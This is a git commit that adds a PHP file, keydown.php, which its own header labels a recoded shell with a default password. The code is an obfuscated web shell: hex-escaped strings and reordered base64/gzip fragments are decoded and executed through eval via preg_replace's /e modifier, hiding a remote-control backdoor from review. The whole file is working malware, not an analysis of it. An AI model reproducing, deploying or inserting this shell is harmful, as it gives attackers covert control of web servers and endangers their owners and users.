09a82207877eea4152fa18dfe35907d3ba152326
Ubaii <31325580+Ubaii@users.noreply.github.com>
2018-07-24 10:21:12 +0700

    Create keydown.php

---
+++ lokal/keydown.php
@@ -0,0 +1,17 @@
+<?php 
+/*
+|===========================================|
+|-------SHELL RECODED BY SYNCHRONIZER-------|
+|--------   Default pass : key      --------|
+|===========================================|
+*/
+$auth_pass="d7b6e9d219bded316d298ce3ca4071ce"; # Change Your MD5 Password #
+
+$cjh2hkh = "RdzOJenTkzoYuiUzp2SvsOwUF40UeXFNSvdnJgdxSRt25JsiaOERlTT+jYCv/6cYU+Z6VR0Eu51IfN85GnDkEPc";
+$cgh1jg = "NY7LboMwEEV/yThEEUtCIMUUGwwx2LsAjYQxjxa1CXx9h6";
+$cjgjh4ghd = "GPFH+vLdnudXKkhqq+U2dha4wB5Yj5nXP36/avyeFmqqzuCksUInpTzVwA7MCt2fZxk2m6YMZ8mecuxPDwr6W6eEX";
+$gkjf3 = "Fis6f/Z0AJ2Li6uqYqHRdaZei3HVKOhMeorPQVECIFqEa5yRa+d832XZLyPMxuc4ffmeG/5nnqQdQxZ4pc7tZOSoto4iyqPsyyoibzGJVk9kwU";
+$payloader = "\x65\x76\x61\x6c\x28\x62\x61\x73\x65\x36\x34\x5f\x64\x65\x63\x6f\x64\x65\x28\x67\x7a\x69\x6e\x66\x6c\x61\x74\x65\x28\x62\x61\x73\x65\x36\x34\x5f\x64\x65\x63\x6f\x64\x65\x28\x24\x70\x61\x79\x6c\x6f\x61\x64\x29\x2c\x30\x29\x29\x29";
+$payload = $cgh1jg.$cjh2hkh.$gkjf3.$cjgjh4ghd;
+preg_replace('/.*/e',$payloader,'.'); 
+?>
